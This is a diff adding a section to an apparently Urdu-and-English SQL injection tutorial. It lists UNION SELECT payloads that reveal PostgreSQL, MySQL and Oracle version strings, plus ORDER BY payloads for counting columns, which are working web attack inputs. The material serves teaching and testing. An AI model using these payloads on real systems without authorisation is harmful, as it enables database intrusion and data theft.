@@ -76,3 +76,28 @@ Yeh command taab use hoti hai jab table main sirf aik column hoo or iusi sy dono
 
 Yeh sub commands hi use hoti hain SQL Injection main information gathering ky liye or yeh haar database ky liye thori bht different hoo skti hain.
 
+
+### Checking Database Version
+
+If PostgreSQL
+
+`' UNION SELECT version(), NULL--`
+
+If MySQL 
+
+`' UNION SELECT @@version, NULL#`
+
+If Oracle: (Oracle mein FROM dual likhna zaroori hota hai)
+
+`' UNION SELECT banner, NULL FROM v$version--`
+
+### Alternative Method
+
+`' ORDER BY 2--`
+`' ORDER BY 3--`
+
+`' ORDER BY 2#`
+`' ORDER BY 3#`
+
+`' ORDER BY 2-- `
+`' ORDER BY 3-- `
